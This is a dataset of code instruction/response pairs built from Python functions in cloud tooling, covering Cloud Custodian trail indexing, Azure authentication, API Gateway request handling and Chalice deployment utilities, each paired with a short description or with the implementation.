{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_trail_ids(cls, event, mode):\n        resource_ids = ()\n        event_name = event['detail']['eventName']\n        event_source = event['detail']['eventSource']\n        for e in mode.get('events', []):\n            if not isinstance(e, dict):\n                # Check if we have a short cut / alias\n                info = CloudWatchEvents.match(event)\n                if info:\n                    return info['ids'].search(event)\n                continue\n            if event_name != e.get('event'):\n                continue\n            if event_source != e.get('source'):\n                continue\n\n            id_query = e.get('ids')\n            if not id_query:\n                raise ValueError(\"No id query configured\")\n            evt = event\n            # be forgiving for users specifying with details or without\n            if not id_query.startswith('detail.'):\n                evt = event.get('detail', {})\n            resource_ids = jmespath.search(id_query, evt)\n            if resource_ids:\n                break\n        return resource_ids", "response": "extract resources ids from a cloud trail event."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating a c7n - org accounts config file using AWS Organizations", "response": "def main(role, ou, assume, profile, output, regions, active):\n    \"\"\"Generate a c7n-org accounts config file using AWS Organizations\n\n    With c7n-org you can then run policies or arbitrary scripts across\n    accounts.\n    \"\"\"\n\n    session = get_session(assume, 'c7n-org', profile)\n    client = session.client('organizations')\n    accounts = []\n    for path in ou:\n        ou = get_ou_from_path(client, path)\n        accounts.extend(get_accounts_for_ou(client, ou, active))\n\n    results = []\n    for a in accounts:\n        tags = []\n        path_parts = a['Path'].strip('/').split('/')\n        for idx, _ in enumerate(path_parts):\n            tags.append(\"path:/%s\" % \"/\".join(path_parts[:idx + 1]))\n\n        ainfo = {\n            'account_id': a['Id'],\n            'email': a['Email'],\n            'name': a['Name'],\n            'tags': tags,\n            'role': role.format(**a)}\n        if regions:\n            ainfo['regions'] = regions\n        results.append(ainfo)\n\n    print(\n        yaml.safe_dump(\n            {'accounts': results},\n            default_flow_style=False),\n        file=output)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndownloads a traildb file for a given account day and region", "response": "def download(config, account, day, region, output):\n    \"\"\"Download a traildb file for a given account/day/region\"\"\"\n\n    with open(config) as fh:\n        config = yaml.safe_load(fh.read())\n\n    jsonschema.validate(config, CONFIG_SCHEMA)\n\n    found = None\n    for info in config['accounts']:\n        if info['name'] == account:\n            found = info\n            break\n\n    if not found:\n        log.info(\"Account %s not found\", account)\n        return\n\n    s3 = boto3.client('s3')\n    day = parse_date(day)\n\n    key_data = dict(found)\n    key_data['region'] = region\n    key_data['date_fmt'] = \"%s/%s/%s\" % (\n        day.year, day.month, day.day)\n    key = config['key_template'] % key_data\n\n    s3.download_file(found['bucket'], key, output + '.bz2')\n    subprocess.check_call([\"lbzip2\", \"-d\", output + '.bz2'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nshows the status of the last record time by account", "response": "def status(config):\n    \"\"\"time series lastest record time by account.\"\"\"\n    with open(config) as fh:\n        config = yaml.safe_load(fh.read())\n    jsonschema.validate(config, CONFIG_SCHEMA)\n    last_index = get_incremental_starts(config, None)\n    accounts = {}\n    for (a, region), last in last_index.items():\n        accounts.setdefault(a, {})[region] = last\n    print(yaml.safe_dump(accounts, default_flow_style=False))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef index(config, start, end, incremental=False, concurrency=5, accounts=None,\n          verbose=False):\n    \"\"\"index traildbs directly from s3 for multiple accounts.\n\n    context: assumes a daily traildb file in s3 with key path\n             specified by key_template in config file for each account\n    \"\"\"\n    with open(config) as fh:\n        config = yaml.safe_load(fh.read())\n    jsonschema.validate(config, CONFIG_SCHEMA)\n\n    if verbose:\n        logging.root.setLevel(logging.DEBUG)\n    log.info(\"tmpdir %s\" % os.environ.get('TMPDIR'))\n\n    with ProcessPoolExecutor(max_workers=concurrency) as w:\n        futures = {}\n\n        if incremental:\n            account_starts = get_incremental_starts(config, start)\n        else:\n            account_starts = defaultdict(lambda : start) # NOQA E203\n\n        for account in config.get('accounts'):\n            if accounts and account['name'] not in accounts:\n                continue\n            for region in account.get('regions'):\n                for d in get_date_range(\n                        account_starts[(account['name'], region)], end):\n                    i = bool(d.hour or d.minute)\n                    p = (config, region, account, d, i)\n                    futures[w.submit(index_account, *p)] = p\n\n        for f in as_completed(futures):\n            _, region, account, d, incremental = futures[f]\n\n            result = f.result()\n            if result is None:\n                continue\n            log.info(\n                (\"processed account:%(account)s day:%(day)s region:%(region)s \"\n                 \"records:%(records)s time:%(time)0.2f db-date:%(db-date)s\"\n                 ) % result)", "response": "index traildbs directly from s3 for multiple accounts"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a sqlite row factory that returns a dictionary", "response": "def dict_factory(cursor, row):\n    \"\"\"Returns a sqlite row factory that returns a dictionary\"\"\"\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fetch_events(cursor, config, account_name):\n    query = config['indexer'].get('query',\n        'select * from events where user_agent glob \\'*CloudCustodian*\\'')\n\n    for event in cursor.execute(query):\n        event['account'] = account_name\n        event['_index'] = config['indexer']['idx_name']\n        event['_type'] = config['indexer'].get('idx_type', 'traildb')\n        yield event", "response": "Generator that returns the events that are available for the given account"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef valid_date(key, config_date):\n    key_date = \"/\".join(key.split(\"/\")[4:7])\n    return parse_date(key_date) > parse_date(config_date)", "response": "Checks that the key is not longer than the config date"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef index(\n        config, date=None, directory=None, concurrency=5, accounts=None,\n        tag=None, verbose=False):\n    \"\"\"index traildbs directly from s3 for multiple accounts.\n\n    context: assumes a daily traildb file in s3 with dated key path\n    \"\"\"\n\n    logging.basicConfig(level=(verbose and logging.DEBUG or logging.INFO))\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n    logging.getLogger('elasticsearch').setLevel(logging.WARNING)\n    logging.getLogger('urllib3').setLevel(logging.WARNING)\n    logging.getLogger('requests').setLevel(logging.WARNING)\n    logging.getLogger('c7n.worker').setLevel(logging.INFO)\n\n    with open(config) as fh:\n        config = yaml.safe_load(fh.read())\n    jsonschema.validate(config, CONFIG_SCHEMA)\n\n    date = get_date_path(date, delta=24)\n    directory = directory or \"/tmp\"\n\n    with ProcessPoolExecutor(max_workers=concurrency) as w:\n        futures = {}\n        jobs = []\n\n        for account in config.get('accounts'):\n            if accounts and account['name'] not in accounts:\n                continue\n            if tag:\n                found = False\n                for t in account['tags'].values():\n                    if tag == t:\n                        found = True\n                        break\n                if not found:\n                    continue\n            for region in account.get('regions'):\n                p = (config, account, region, date, directory)\n                jobs.append(p)\n\n        for j in jobs:\n            log.debug(\"submit account:{} region:{} date:{}\".format(\n                j[1]['name'], j[2], j[3]))\n            futures[w.submit(index_account_trails, *j)] = j\n\n        # Process completed\n        for f in as_completed(futures):\n            config, account, region, date, directory = futures[f]\n            if f.exception():\n                log.warning(\"error account:{} region:{} error:{}\".format(\n                    account['name'], region, f.exception()))\n                continue\n            log.info(\"complete account:{} region:{}\".format(\n                account['name'], region))", "response": "index traildbs directly from s3 for multiple accounts"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _initialize_session(self):\n\n        # Only run once\n        if self.credentials is not None:\n            return\n\n        tenant_auth_variables = [\n            constants.ENV_TENANT_ID, constants.ENV_SUB_ID,\n            constants.ENV_CLIENT_ID, constants.ENV_CLIENT_SECRET\n        ]\n\n        token_auth_variables = [\n            constants.ENV_ACCESS_TOKEN, constants.ENV_SUB_ID\n        ]\n\n        msi_auth_variables = [\n            constants.ENV_USE_MSI, constants.ENV_SUB_ID\n        ]\n\n        if self.authorization_file:\n            self.credentials, self.subscription_id = self.load_auth_file(self.authorization_file)\n            self.log.info(\"Creating session with authorization file\")\n\n        elif all(k in os.environ for k in token_auth_variables):\n            # Token authentication\n            self.credentials = BasicTokenAuthentication(\n                token={\n                    'access_token': os.environ[constants.ENV_ACCESS_TOKEN]\n                })\n            self.subscription_id = os.environ[constants.ENV_SUB_ID]\n            self.log.info(\"Creating session with Token Authentication\")\n            self._is_token_auth = True\n\n        elif all(k in os.environ for k in tenant_auth_variables):\n            # Tenant (service principal) authentication\n            self.credentials = ServicePrincipalCredentials(\n                client_id=os.environ[constants.ENV_CLIENT_ID],\n                secret=os.environ[constants.ENV_CLIENT_SECRET],\n                tenant=os.environ[constants.ENV_TENANT_ID],\n                resource=self.resource_namespace)\n            self.subscription_id = os.environ[constants.ENV_SUB_ID]\n            self.tenant_id = os.environ[constants.ENV_TENANT_ID]\n            self.log.info(\"Creating session with Service Principal Authentication\")\n\n        elif all(k in os.environ for k in msi_auth_variables):\n            # MSI authentication\n            if constants.ENV_CLIENT_ID in os.environ:\n                self.credentials = MSIAuthentication(\n                    client_id=os.environ[constants.ENV_CLIENT_ID],\n                    resource=self.resource_namespace)\n            else:\n                self.credentials = MSIAuthentication(\n                    resource=self.resource_namespace)\n\n            self.subscription_id = os.environ[constants.ENV_SUB_ID]\n            self.log.info(\"Creating session with MSI Authentication\")\n        else:\n            # Azure CLI authentication\n            self._is_cli_auth = True\n            (self.credentials,\n             self.subscription_id,\n             self.tenant_id) = Profile().get_login_credentials(\n                resource=self.resource_namespace)\n            self.log.info(\"Creating session with Azure CLI Authentication\")\n\n        # Let provided id parameter override everything else\n        if self.subscription_id_override is not None:\n            self.subscription_id = self.subscription_id_override\n\n        self.log.info(\"Session using Subscription ID: %s\" % self.subscription_id)\n\n        if self.credentials is None:\n            self.log.error('Unable to locate credentials for Azure session.')", "response": "Initializes the session with the available authentication type."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget the latest non - preview api version for a resource.", "response": "def resource_api_version(self, resource_id):\n        \"\"\" latest non-preview api version for resource \"\"\"\n\n        namespace = ResourceIdParser.get_namespace(resource_id)\n        resource_type = ResourceIdParser.get_resource_type(resource_id)\n\n        cache_id = namespace + resource_type\n\n        if cache_id in self._provider_cache:\n            return self._provider_cache[cache_id]\n\n        resource_client = self.client('azure.mgmt.resource.ResourceManagementClient')\n        provider = resource_client.providers.get(namespace)\n\n        rt = next((t for t in provider.resource_types\n            if StringUtils.equal(t.resource_type, resource_type)), None)\n\n        if rt and rt.api_versions:\n            versions = [v for v in rt.api_versions if 'preview' not in v.lower()]\n            api_version = versions[0] if versions else rt.api_versions[0]\n            self._provider_cache[cache_id] = api_version\n            return api_version"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding auth json string for deploying Azure Functions.", "response": "def get_functions_auth_string(self, target_subscription_id):\n        \"\"\"\n        Build auth json string for deploying\n        Azure Functions.  Look for dedicated\n        Functions environment variables or\n        fall back to normal Service Principal\n        variables.\n\n        \"\"\"\n\n        self._initialize_session()\n\n        function_auth_variables = [\n            constants.ENV_FUNCTION_TENANT_ID,\n            constants.ENV_FUNCTION_CLIENT_ID,\n            constants.ENV_FUNCTION_CLIENT_SECRET\n        ]\n\n        # Use dedicated function env vars if available\n        if all(k in os.environ for k in function_auth_variables):\n            auth = {\n                'credentials':\n                    {\n                        'client_id': os.environ[constants.ENV_FUNCTION_CLIENT_ID],\n                        'secret': os.environ[constants.ENV_FUNCTION_CLIENT_SECRET],\n                        'tenant': os.environ[constants.ENV_FUNCTION_TENANT_ID]\n                    },\n                'subscription': target_subscription_id\n            }\n\n        elif type(self.credentials) is ServicePrincipalCredentials:\n            auth = {\n                'credentials':\n                    {\n                        'client_id': os.environ[constants.ENV_CLIENT_ID],\n                        'secret': os.environ[constants.ENV_CLIENT_SECRET],\n                        'tenant': os.environ[constants.ENV_TENANT_ID]\n                    },\n                'subscription': target_subscription_id\n            }\n\n        else:\n            raise NotImplementedError(\n                \"Service Principal credentials are the only \"\n                \"supported auth mechanism for deploying functions.\")\n\n        return json.dumps(auth, indent=2)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nqueries a set of resources.", "response": "def filter(self, resource_manager, **params):\n        \"\"\"Query a set of resources.\"\"\"\n        m = self.resolve(resource_manager.resource_type)\n        client = local_session(self.session_factory).client(\n            m.service, resource_manager.config.region)\n        enum_op, path, extra_args = m.enum_spec\n        if extra_args:\n            params.update(extra_args)\n        return self._invoke_client_enum(\n            client, enum_op, params, path,\n            getattr(resource_manager, 'retry', None)) or []"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, resource_manager, identities):\n        m = self.resolve(resource_manager.resource_type)\n        params = {}\n        client_filter = False\n\n        # Try to formulate server side query\n        if m.filter_name:\n            if m.filter_type == 'list':\n                params[m.filter_name] = identities\n            elif m.filter_type == 'scalar':\n                assert len(identities) == 1, \"Scalar server side filter\"\n                params[m.filter_name] = identities[0]\n        else:\n            client_filter = True\n\n        resources = self.filter(resource_manager, **params)\n        if client_filter:\n            # This logic was added to prevent the issue from:\n            # https://github.com/capitalone/cloud-custodian/issues/1398\n            if all(map(lambda r: isinstance(r, six.string_types), resources)):\n                resources = [r for r in resources if r in identities]\n            else:\n                resources = [r for r in resources if r[m.id] in identities]\n\n        return resources", "response": "Get resources by identities"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef filter(self, resource_manager, **params):\n        m = self.resolve(resource_manager.resource_type)\n        client = local_session(self.session_factory).client(m.service)\n\n        enum_op, path, extra_args = m.enum_spec\n        if extra_args:\n            params.update(extra_args)\n\n        parent_type, parent_key, annotate_parent = m.parent_spec\n        parents = self.manager.get_resource_manager(parent_type)\n        parent_ids = [p[parents.resource_type.id] for p in parents.resources()]\n\n        # Bail out with no parent ids...\n        existing_param = parent_key in params\n        if not existing_param and len(parent_ids) == 0:\n            return []\n\n        # Handle a query with parent id\n        if existing_param:\n            return self._invoke_client_enum(client, enum_op, params, path)\n\n        # Have to query separately for each parent's children.\n        results = []\n        for parent_id in parent_ids:\n            merged_params = self.get_parent_parameters(params, parent_id, parent_key)\n            subset = self._invoke_client_enum(\n                client, enum_op, merged_params, path, retry=self.manager.retry)\n            if annotate_parent:\n                for r in subset:\n                    r[self.parent_key] = parent_id\n            if subset and self.capture_parent_id:\n                results.extend([(parent_id, s) for s in subset])\n            elif subset:\n                results.extend(subset)\n        return results", "response": "Query a set of resources."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating an api gw response from a wsgi app and environ.", "response": "def create_gw_response(app, wsgi_env):\n    \"\"\"Create an api gw response from a wsgi app and environ.\n    \"\"\"\n    response = {}\n    buf = []\n    result = []\n\n    def start_response(status, headers, exc_info=None):\n        result[:] = [status, headers]\n        return buf.append\n\n    appr = app(wsgi_env, start_response)\n    close_func = getattr(appr, 'close', None)\n    try:\n        buf.extend(list(appr))\n    finally:\n        close_func and close_func()\n\n    response['body'] = ''.join(buf)\n    response['statusCode'] = result[0].split(' ', 1)[0]\n    response['headers'] = {}\n\n    for k, v in result[1]:\n        response['headers'][k] = v\n    if 'Content-Length' not in response['headers']:\n        response['headers']['Content-Length'] = str(len(response['body']))\n    if 'Content-Type' not in response['headers']:\n        response['headers']['Content-Type'] = 'text/plain'\n    return response"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_wsgi_request(event, server_name='apigw'):\n    path = urllib.url2pathname(event['path'])\n    script_name = (\n        event['headers']['Host'].endswith('.amazonaws.com') and\n        event['requestContext']['stage'] or '').encode('utf8')\n    query = event['queryStringParameters']\n    query_string = query and urllib.urlencode(query) or \"\"\n    body = event['body'] and event['body'].encode('utf8') or ''\n\n    environ = {\n        'HTTPS': 'on',\n        'PATH_INFO': path.encode('utf8'),\n        'QUERY_STRING': query_string.encode('utf8'),\n        'REMOTE_ADDR': event[\n            'requestContext']['identity']['sourceIp'].encode('utf8'),\n        'REQUEST_METHOD': event['httpMethod'].encode('utf8'),\n        'SCRIPT_NAME': script_name,\n        'SERVER_NAME': server_name.encode('utf8'),\n        'SERVER_PORT': '80'.encode('utf8'),\n        'SERVER_PROTOCOL': u'HTTP/1.1'.encode('utf8'),\n\n        'wsgi.errors': sys.stderr,\n        'wsgi.input': StringIO(body),\n        'wsgi.multiprocess': False,\n        'wsgi.multithread': False,\n        'wsgi.run_once': False,\n        'wsgi.url_scheme': u'https'.encode('utf8'),\n        'wsgi.version': (1, 0),\n    }\n\n    headers = event['headers']\n    # Input processing\n    if event['httpMethod'] in (\"POST\", \"PUT\", \"PATCH\"):\n        if 'Content-Type' in headers:\n            environ['CONTENT_TYPE'] = headers['Content-Type']\n        environ['CONTENT_LENGTH'] = str(len(body))\n\n    for header in list(event['headers'].keys()):\n        wsgi_name = \"HTTP_\" + header.upper().replace('-', '_')\n        environ[wsgi_name] = headers[header].encode('utf8')\n\n    if script_name:\n        path_info = environ['PATH_INFO']\n        if script_name in path_info:\n            environ['PATH_INFO'].replace(script_name, '')\n\n    # Extract remote user from event\n    remote_user = None\n    if event['requestContext'].get('authorizer'):\n        remote_user = event[\n            'requestContext']['authorizer'].get('principalId')\n    elif event['requestContext'].get('identity'):\n        remote_user = event['requestContext']['identity'].get('userArn')\n    if remote_user:\n        environ['REMOTE_USER'] = remote_user\n\n    # apigw aware integrations\n    environ['apigw.request'] = event['requestContext']\n    environ['apigw.stagevars'] = event['stageVariables']\n\n    return environ", "response": "Create a wsgi environment from an apigw request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a LogRetriever from a client and lambda arn.", "response": "def create_from_lambda_arn(cls, client, lambda_arn):\n        # type: (TypedAWSClient, str) -> LogRetriever\n        \"\"\"Create a LogRetriever from a client and lambda arn.\n\n        :type client: botocore.client.Logs\n        :param client: A ``logs`` client.\n\n        :type lambda_arn: str\n        :param lambda_arn: The ARN of the lambda function.\n\n        :return: An instance of ``LogRetriever``.\n\n        \"\"\"\n        lambda_name = lambda_arn.split(':')[6]\n        log_group_name = '/aws/lambda/%s' % lambda_name\n        return cls(client, log_group_name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nretrieve the log entries from the log group.", "response": "def retrieve_logs(self, include_lambda_messages=True, max_entries=None):\n        # type: (bool, Optional[int]) -> Iterator[Dict[str, Any]]\n        \"\"\"Retrieve logs from a log group.\n\n        :type include_lambda_messages: boolean\n        :param include_lambda_messages: Include logs generated by the AWS\n            Lambda service.  If this value is False, only chalice logs will be\n            included.\n\n        :type max_entries: int\n        :param max_entries: Maximum number of log messages to include.\n\n        :rtype: iterator\n        :return: An iterator that yields event dicts.  Each event\n            dict has these keys:\n\n            * logStreamName -> (string) The name of the log stream.\n            * timestamp -> (datetime.datetime) - The timestamp for the msg.\n            * message -> (string) The data contained in the log event.\n            * ingestionTime -> (datetime.datetime) Ingestion time of event.\n            * eventId -> (string) A unique identifier for this event.\n            * logShortId -> (string) Short identifier for logStreamName.\n\n        \"\"\"\n        # TODO: Add support for startTime/endTime.\n        shown = 0\n        for event in self._client.iter_log_events(self._log_group_name,\n                                                  interleaved=True):\n            if not include_lambda_messages and \\\n                    self._is_lambda_message(event):\n                continue\n            # logStreamName is: '2016/07/05/[id]hash'\n            # We want to extract the hash portion and\n            # provide a short identifier.\n            identifier = event['logStreamName']\n            if ']' in identifier:\n                index = identifier.find(']')\n                identifier = identifier[index + 1:index + 7]\n            event['logShortId'] = identifier\n            yield event\n            shown += 1\n            if max_entries is not None and shown >= max_entries:\n                return"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nvalidating app configuration. The purpose of this method is to provide a fail fast mechanism for anything we know is going to fail deployment. We can detect common error cases and provide the user with helpful error messages.", "response": "def validate_configuration(config):\n    # type: (Config) -> None\n    \"\"\"Validate app configuration.\n\n    The purpose of this method is to provide a fail fast mechanism\n    for anything we know is going to fail deployment.\n    We can detect common error cases and provide the user with helpful\n    error messages.\n\n    \"\"\"\n    routes = config.chalice_app.routes\n    validate_routes(routes)\n    validate_route_content_types(routes, config.chalice_app.api.binary_types)\n    _validate_manage_iam_role(config)\n    validate_python_version(config)\n    validate_unique_function_names(config)\n    validate_feature_flags(config.chalice_app)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nvalidating that the given configuration matches a specific python version.", "response": "def validate_python_version(config, actual_py_version=None):\n    # type: (Config, Optional[str]) -> None\n    \"\"\"Validate configuration matches a specific python version.\n\n    If the ``actual_py_version`` is not provided, it will default\n    to the major/minor version of the currently running python\n    interpreter.\n\n    :param actual_py_version: The major/minor python version in\n        the form \"pythonX.Y\", e.g \"python2.7\", \"python3.6\".\n\n    \"\"\"\n    lambda_version = config.lambda_python_version\n    if actual_py_version is None:\n        actual_py_version = 'python%s.%s' % sys.version_info[:2]\n    if actual_py_version != lambda_version:\n        # We're not making this a hard error for now, but we may\n        # turn this into a hard fail.\n        warnings.warn(\"You are currently running %s, but the closest \"\n                      \"supported version on AWS Lambda is %s\\n\"\n                      \"Please use %s, otherwise you may run into \"\n                      \"deployment issues. \" %\n                      (actual_py_version, lambda_version, lambda_version),\n                      stacklevel=2)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _execute(self,\n                 command,        # type: str\n                 args,           # type: List[str]\n                 env_vars=None,  # type: EnvVars\n                 shim=None       # type: OptStr\n                 ):\n        # type: (...) -> Tuple[int, bytes, bytes]\n        \"\"\"Execute a pip command with the given arguments.\"\"\"\n        main_args = [command] + args\n        logger.debug(\"calling pip %s\", ' '.join(main_args))\n        rc, out, err = self._wrapped_pip.main(main_args, env_vars=env_vars,\n                                              shim=shim)\n        return rc, out, err", "response": "Execute a pip command with the given arguments."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding an sdist into a wheel file.", "response": "def build_wheel(self, wheel, directory, compile_c=True):\n        # type: (str, str, bool) -> None\n        \"\"\"Build an sdist into a wheel file.\"\"\"\n        arguments = ['--no-deps', '--wheel-dir', directory, wheel]\n        env_vars = self._osutils.environ()\n        shim = ''\n        if not compile_c:\n            env_vars.update(pip_no_compile_c_env_vars)\n            shim = pip_no_compile_c_shim\n        # Ignore rc and stderr from this command since building the wheels\n        # may fail and we will find out when we categorize the files that were\n        # generated.\n        self._execute('wheel', arguments,\n                      env_vars=env_vars, shim=shim)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef download_all_dependencies(self, requirements_filename, directory):\n        # type: (str, str) -> None\n        \"\"\"Download all dependencies as sdist or wheel.\"\"\"\n        arguments = ['-r', requirements_filename, '--dest', directory]\n        rc, out, err = self._execute('download', arguments)\n        # When downloading all dependencies we expect to get an rc of 0 back\n        # since we are casting a wide net here letting pip have options about\n        # what to download. If a package is not found it is likely because it\n        # does not exist and was mispelled. In this case we raise an error with\n        # the package name. Otherwise a nonzero rc results in a generic\n        # download error where we pass along the stderr.\n        if rc != 0:\n            if err is None:\n                err = b'Unknown error'\n            error = err.decode()\n            match = re.search((\"Could not find a version that satisfies the \"\n                               \"requirement (.+?) \"), error)\n            if match:\n                package_name = match.group(1)\n                raise NoSuchPackageError(str(package_name))\n            raise PackageDownloadError(error)\n        stdout = out.decode()\n        matches = re.finditer(self._LINK_IS_DIR_PATTERN, stdout)\n        for match in matches:\n            wheel_package_path = str(match.group(1))\n            # Looks odd we do not check on the error status of building the\n            # wheel here. We can assume this is a valid package path since\n            # we already passed the pip download stage. This stage would have\n            # thrown a PackageDownloadError if any of the listed packages were\n            # not valid.\n            # If it fails the actual build step, it will have the same behavior\n            # as any other package we fail to build a valid wheel for, and\n            # complain at deployment time.\n            self.build_wheel(wheel_package_path, directory)", "response": "Download all dependencies as sdist or wheel."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndownloading wheel files for manylinux for all the given packages.", "response": "def download_manylinux_wheels(self, abi, packages, directory):\n        # type: (str, List[str], str) -> None\n        \"\"\"Download wheel files for manylinux for all the given packages.\"\"\"\n        # If any one of these dependencies fails pip will bail out. Since we\n        # are only interested in all the ones we can download, we need to feed\n        # each package to pip individually. The return code of pip doesn't\n        # matter here since we will inspect the working directory to see which\n        # wheels were downloaded. We are only interested in wheel files\n        # compatible with lambda, which means manylinux1_x86_64 platform and\n        # cpython implementation. The compatible abi depends on the python\n        # version and is checked later.\n        for package in packages:\n            arguments = ['--only-binary=:all:', '--no-deps', '--platform',\n                         'manylinux1_x86_64', '--implementation', 'cp',\n                         '--abi', abi, '--dest', directory, package]\n            self._execute('download', arguments)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef to_cfn_resource_name(name):\n    # type: (str) -> str\n    \"\"\"Transform a name to a valid cfn name.\n\n    This will convert the provided name to a CamelCase name.\n    It's possible that the conversion to a CFN resource name\n    can result in name collisions.  It's up to the caller\n    to handle name collisions appropriately.\n\n    \"\"\"\n    if not name:\n        raise ValueError(\"Invalid name: %r\" % name)\n    word_separators = ['-', '_']\n    for word_separator in word_separators:\n        word_parts = [p for p in name.split(word_separator) if p]\n        name = ''.join([w[0].upper() + w[1:] for w in word_parts])\n    return re.sub(r'[^A-Za-z0-9]+', '', name)", "response": "Transform a name to a valid CFN resource name."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndeletes a top level key from the deployed JSON file.", "response": "def remove_stage_from_deployed_values(key, filename):\n    # type: (str, str) -> None\n    \"\"\"Delete a top level key from the deployed JSON file.\"\"\"\n    final_values = {}  # type: Dict[str, Any]\n    try:\n        with open(filename, 'r') as f:\n            final_values = json.load(f)\n    except IOError:\n        # If there is no file to delete from, then this funciton is a noop.\n        return\n\n    try:\n        del final_values[key]\n        with open(filename, 'wb') as f:\n            data = serialize_to_json(final_values)\n            f.write(data.encode('utf-8'))\n    except KeyError:\n        # If they key didn't exist then there is nothing to remove.\n        pass"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nrecord deployed values to a JSON file.", "response": "def record_deployed_values(deployed_values, filename):\n    # type: (Dict[str, Any], str) -> None\n    \"\"\"Record deployed values to a JSON file.\n\n    This allows subsequent deploys to lookup previously deployed values.\n\n    \"\"\"\n    final_values = {}  # type: Dict[str, Any]\n    if os.path.isfile(filename):\n        with open(filename, 'r') as f:\n            final_values = json.load(f)\n    final_values.update(deployed_values)\n    with open(filename, 'wb') as f:\n        data = serialize_to_json(final_values)\n        f.write(data.encode('utf-8'))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create_zip_file(source_dir, outfile):\n    # type: (str, str) -> None\n    \"\"\"Create a zip file from a source input directory.\n\n    This function is intended to be an equivalent to\n    `zip -r`.  You give it a source directory, `source_dir`,\n    and it will recursively zip up the files into a zipfile\n    specified by the `outfile` argument.\n\n    \"\"\"\n    with zipfile.ZipFile(outfile, 'w',\n                         compression=zipfile.ZIP_DEFLATED) as z:\n        for root, _, filenames in os.walk(source_dir):\n            for filename in filenames:\n                full_name = os.path.join(root, filename)\n                archive_name = os.path.relpath(full_name, source_dir)\n                z.write(full_name, archive_name)", "response": "Create a zip file from a source directory."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update_function(self,\n                        function_name,               # type: str\n                        zip_contents,                # type: str\n                        environment_variables=None,  # type: StrMap\n                        runtime=None,                # type: OptStr\n                        tags=None,                   # type: StrMap\n                        timeout=None,                # type: OptInt\n                        memory_size=None,            # type: OptInt\n                        role_arn=None,               # type: OptStr\n                        subnet_ids=None,             # type: OptStrList\n                        security_group_ids=None,     # type: OptStrList\n                        layers=None,                 # type: OptStrList\n                        ):\n        # type: (...) -> Dict[str, Any]\n        \"\"\"Update a Lambda function's code and configuration.\n\n        This method only updates the values provided to it. If a parameter\n        is not provided, no changes will be made for that that parameter on\n        the targeted lambda function.\n        \"\"\"\n        return_value = self._update_function_code(function_name=function_name,\n                                                  zip_contents=zip_contents)\n        self._update_function_config(\n            environment_variables=environment_variables,\n            runtime=runtime,\n            timeout=timeout,\n            memory_size=memory_size,\n            role_arn=role_arn,\n            subnet_ids=subnet_ids,\n            security_group_ids=security_group_ids,\n            function_name=function_name,\n            layers=layers\n        )\n        if tags is not None:\n            self._update_function_tags(return_value['FunctionArn'], tags)\n        return return_value", "response": "Updates a Lambda function s code and configuration."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef delete_role(self, name):\n        # type: (str) -> None\n        \"\"\"Delete a role by first deleting all inline policies.\"\"\"\n        client = self._client('iam')\n        inline_policies = client.list_role_policies(\n            RoleName=name\n        )['PolicyNames']\n        for policy_name in inline_policies:\n            self.delete_role_policy(name, policy_name)\n        client.delete_role(RoleName=name)", "response": "Delete a role by first deleting all inline policies."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets the rest api id associated with an API name.", "response": "def get_rest_api_id(self, name):\n        # type: (str) -> Optional[str]\n        \"\"\"Get rest api id associated with an API name.\n\n        :type name: str\n        :param name: The name of the rest api.\n\n        :rtype: str\n        :return: If the rest api exists, then the restApiId\n            is returned, otherwise None.\n\n        \"\"\"\n        rest_apis = self._client('apigateway').get_rest_apis()['items']\n        for api in rest_apis:\n            if api['name'] == name:\n                return api['id']\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncheck if an API Gateway REST API exists.", "response": "def rest_api_exists(self, rest_api_id):\n        # type: (str) -> bool\n        \"\"\"Check if an an API Gateway REST API exists.\"\"\"\n        client = self._client('apigateway')\n        try:\n            client.get_rest_api(restApiId=rest_api_id)\n            return True\n        except client.exceptions.NotFoundException:\n            return False"}
